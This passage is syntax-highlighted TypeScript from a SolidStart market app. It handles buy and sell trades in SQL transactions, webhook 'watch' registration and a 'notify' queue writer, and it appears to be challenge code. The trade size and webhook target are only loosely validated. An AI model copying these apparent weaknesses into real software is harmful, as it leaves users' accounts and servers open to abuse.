</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">userId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">market</span><span class="o">:</span> <span class="nx">marketArray</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">inventory</span><span class="o">:</span> <span class="nx">inventoryDict</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">watchedItems</span><span class="o">:</span> <span class="nx">watching</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">kind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="kd">function</span> <span class="nx">Home</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">useRouteData</span><span class="o">&lt;</span><span class="k">typeof</span> <span class="nx">routeData</span><span class="o">&gt;</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">[,</span> <span class="p">{</span> <span class="nx">Form</span><span class="o">:</span> <span class="nx">LogoutForm</span> <span class="p">}]</span> <span class="o">=</span> <span class="nx">createServerAction$</span><span class="p">((</span><span class="nx">f</span><span class="o">:</span> <span class="nx">FormData</span><span class="p">,</span> <span class="p">{</span> <span class="nx">request</span> <span class="p">})</span> <span class="p">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">logout</span><span class="p">(</span><span class="nx">request</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">[</span><span class="nx">transacting</span><span class="p">,</span> <span class="p">{</span> <span class="nx">Form</span><span class="o">:</span> <span class="nx">Transact</span> <span class="p">}]</span> <span class="o">=</span> <span class="nx">createServerAction$</span><span class="p">(</span><span class="kr">async</span> <span class="p">(</span><span class="nx">f</span><span class="o">:</span> <span class="nx">FormData</span><span class="p">,</span> <span class="p">{</span> <span class="nx">request</span> <span class="p">})</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">userId</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">requireUserId</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">action</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">action</span> <span class="o">===</span> <span class="s1">&#39;buy&#39;</span> <span class="o">||</span> <span class="nx">action</span> <span class="o">===</span> <span class="s1">&#39;sell&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">item</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;item&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">size</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;size&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">item</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">size</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Bad submission&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">dirsign</span> <span class="o">=</span> <span class="nx">action</span> <span class="o">===</span> <span class="s1">&#39;buy&#39;</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">tradewith</span> <span class="o">=</span> <span class="nx">action</span> <span class="o">===</span> <span class="s1">&#39;buy&#39;</span> <span class="o">?</span> <span class="s1">&#39;ask&#39;</span> <span class="o">:</span> <span class="s1">&#39;bid&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">signedSize</span> <span class="o">=</span> <span class="nx">dirsign</span> <span class="o">*</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">begin</span><span class="p">(</span><span class="kr">async</span> <span class="p">(</span><span class="nx">sql</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="kr">await</span> <span class="nx">sql</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">            INSERT INTO inventory (user_id, item_id, count)
</span></span></span><span class="line"><span class="cl"><span class="sb">            VALUES (</span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">item</span><span class="si">}</span><span class="sb">, 0)
</span></span></span><span class="line"><span class="cl"><span class="sb">            ON CONFLICT (user_id, item_id) DO NOTHING
</span></span></span><span class="line"><span class="cl"><span class="sb">          `</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="kr">await</span> <span class="nx">sql</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">          WITH current_market AS (
</span></span></span><span class="line"><span class="cl"><span class="sb">            UPDATE market
</span></span></span><span class="line"><span class="cl"><span class="sb">            SET </span><span class="si">${</span><span class="nx">sql</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">tradewith</span><span class="si">}</span><span class="sb">_size`</span><span class="p">)</span><span class="si">}</span><span class="sb"> = </span><span class="si">${</span><span class="nx">sql</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">tradewith</span><span class="si">}</span><span class="sb">_size`</span><span class="p">)</span><span class="si">}</span><span class="sb"> - </span><span class="si">${</span><span class="nx">size</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">            WHERE item_id = </span><span class="si">${</span><span class="nx">item</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">            RETURNING </span><span class="si">${</span><span class="nx">sql</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">tradewith</span><span class="si">}</span><span class="sb">_price`</span><span class="p">)</span><span class="si">}</span><span class="sb"> as price
</span></span></span><span class="line"><span class="cl"><span class="sb">          )
</span></span></span><span class="line"><span class="cl"><span class="sb">          UPDATE inventory
</span></span></span><span class="line"><span class="cl"><span class="sb">          SET count = count - </span><span class="si">${</span><span class="nx">signedSize</span><span class="si">}</span><span class="sb"> * price
</span></span></span><span class="line"><span class="cl"><span class="sb">          FROM current_market
</span></span></span><span class="line"><span class="cl"><span class="sb">          WHERE item_id = </span><span class="si">${</span><span class="nx">COIN_ID</span><span class="si">}</span><span class="sb"> AND user_id = </span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">          `</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="kr">await</span> <span class="nx">sql</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">            UPDATE inventory
</span></span></span><span class="line"><span class="cl"><span class="sb">            SET count = count + </span><span class="si">${</span><span class="nx">signedSize</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">            WHERE item_id = </span><span class="si">${</span><span class="nx">item</span><span class="si">}</span><span class="sb"> AND user_id = </span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">          `</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="sb">`You are no longer able to </span><span class="si">${</span><span class="nx">action</span><span class="si">}</span><span class="sb"> that item`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">action</span> <span class="o">===</span> <span class="s1">&#39;watch&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">target</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">kind</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;kind&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;secret&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">target</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">kind</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="o">||</span> <span class="k">typeof</span> <span class="nx">secret</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Bad submission&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="sr">/^[0-9]+$/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">secret</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Unable to start watching&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span> <span class="nx">fieldErrors</span><span class="o">:</span> <span class="p">{</span> <span class="nx">secret</span><span class="o">:</span> <span class="s1">&#39;Secret must be a number&#39;</span> <span class="p">}</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">newId</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">sql</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">          INSERT INTO hooks(user_id, kind, target, secret)
</span></span></span><span class="line"><span class="cl"><span class="sb">          VALUES (</span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">kind</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">target</span><span class="si">}</span><span class="sb">, </span><span class="si">${</span><span class="nx">secret</span><span class="si">}</span><span class="sb">)
</span></span></span><span class="line"><span class="cl"><span class="sb">          RETURNING id
</span></span></span><span class="line"><span class="cl"><span class="sb">        `</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">redirect</span><span class="p">(</span><span class="sb">`/?watchId=</span><span class="si">${</span><span class="nx">newId</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">!</span><span class="p">.</span><span class="nx">id</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Unable to watch that item&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">action</span> <span class="o">===</span> <span class="s1">&#39;unwatch&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">kind</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;kind&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">hookId</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">kind</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="p">(</span><span class="nx">hookId</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">hookId</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Bad submission&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">hookFilter</span> <span class="o">=</span> <span class="nx">hookId</span> <span class="o">?</span> <span class="nx">sql</span><span class="sb">`id = </span><span class="si">${</span><span class="nx">hookId</span><span class="si">}</span><span class="sb">`</span> <span class="o">:</span> <span class="nx">sql</span><span class="sb">`TRUE`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="kr">await</span> <span class="nx">sql</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">        DELETE FROM hooks
</span></span></span><span class="line"><span class="cl"><span class="sb">        WHERE user_id = </span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb"> AND kind = </span><span class="si">${</span><span class="nx">kind</span><span class="si">}</span><span class="sb"> AND </span><span class="si">${</span><span class="nx">hookFilter</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">      `</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">action</span> <span class="o">===</span> <span class="s1">&#39;notify&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">kind</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;kind&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">kind</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Bad submission&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">requestHook</span><span class="p">()</span> <span class="o">!==</span> <span class="s1">&#39;can-hook&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Unable to notify at this time&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nx">data</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s1">&#39;kind&#39;</span><span class="p">,</span> <span class="nx">kind</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="p">[</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">]</span> <span class="k">of</span> <span class="nx">f</span><span class="p">.</span><span class="nx">entries</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Bad submission&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">key</span> <span class="o">===</span> <span class="s1">&#39;kind&#39;</span> <span class="o">||</span> <span class="nx">key</span> <span class="o">===</span> <span class="s1">&#39;action&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">appendFile</span><span class="p">(</span><span class="s1">&#39;/queue/hook&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Unable to trigger the notification&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">throw</span> <span class="k">new</span> <span class="nx">FormError</span><span class="p">(</span><span class="s1">&#39;Action is not implemented&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">inventoryCount</span> <span class="o">=</span> <span class="p">(</span><span class="nx">item_id</span><span class="o">:</span> <span class="nx">string</span><span class="p">)</span> <span class="p">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="nx">inventory</span><span class="o">?</span><span class="p">.[</span><span class="nx">item_id</span><span class="p">]</span> <span class="o">??</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">createEffect</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">transacting</span><span class="p">.</span><span class="nx">error</span><span class="p">)</span> <span class="nx">toast</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">transacting</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">notifyingItem</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">transacting</span><span class="p">.</span><span class="nx">input</span><span class="o">?</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="s1">&#39;notify&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// TODO: progressively enhanced responses
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">main</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="o">&lt;</span><span class="nx">div</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;markets&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">For</span> <span class="nx">each</span><span class="o">=</span><span class="p">{</span><span class="nx">data</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="nx">market</span><span class="p">}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="p">{(</span><span class="nx">it</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">transactingHere</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="nx">transacting</span><span class="p">.</span><span class="nx">input</span><span class="o">?</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;item&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="nx">it</span><span class="p">.</span><span class="nx">id</span> <span class="o">?</span> <span class="nx">transacting</span> <span class="o">:</span> <span class="kc">undefined</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">transactingWatch</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="p">([</span><span class="s1">&#39;watch&#39;</span><span class="p">,</span> <span class="s1">&#39;unwatch&#39;</span><span class="p">]</span> <span class="nx">as</span> <span class="nx">unknown</span><span class="p">[]).</span><span class="nx">includes</span><span class="p">(</span><span class="nx">transactingHere</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="nx">input</span><span class="o">?</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="p">[</span><span class="nx">watchOverlayShown</span><span class="p">,</span> <span class="nx">showWatchOverlay</span><span class="p">]</span> <span class="o">=</span> <span class="nx">createSignal</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">              <span class="nx">transactingWatch</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nx">transactingHere</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="nx">pending</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">watchingItem</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">data</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="nx">watchedItems</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">it</span><span class="p">.</span><span class="nx">kind</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// hide or show the overlay based on whether we succeeded in watching
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">createEffect</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="nx">transactingHere</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="nx">pending</span> <span class="o">===</span> <span class="kc">true</span> <span class="o">&amp;&amp;</span> <span class="nx">transactingWatch</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">onCleanup</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">transactingHere</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="nx">error</span><span class="p">)</span> <span class="nx">showWatchOverlay</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">              <span class="p">}</span>
</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="nx">transactingHere</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="nx">pending</span> <span class="o">===</span> <span class="kc">true</span> <span class="o">&amp;&amp;</span> <span class="nx">notifyingItem</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">onCleanup</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">transactingHere</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="nx">error</span><span class="p">)</span> <span class="nx">toast</span><span class="p">(</span><span class="sb">`Notified watchers of </span><span class="si">${</span><span class="nx">it</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">              <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">&lt;</span><span class="nx">Transact</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="o">&lt;</span><span class="nx">div</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;market&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;size&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;item&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">it</span><span class="p">.</span><span class="nx">id</span><span class="p">}</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;kind&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">it</span><span class="p">.</span><span class="nx">kind</span><span class="p">}</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;image&#34;</span><span class="o">&gt;</span>
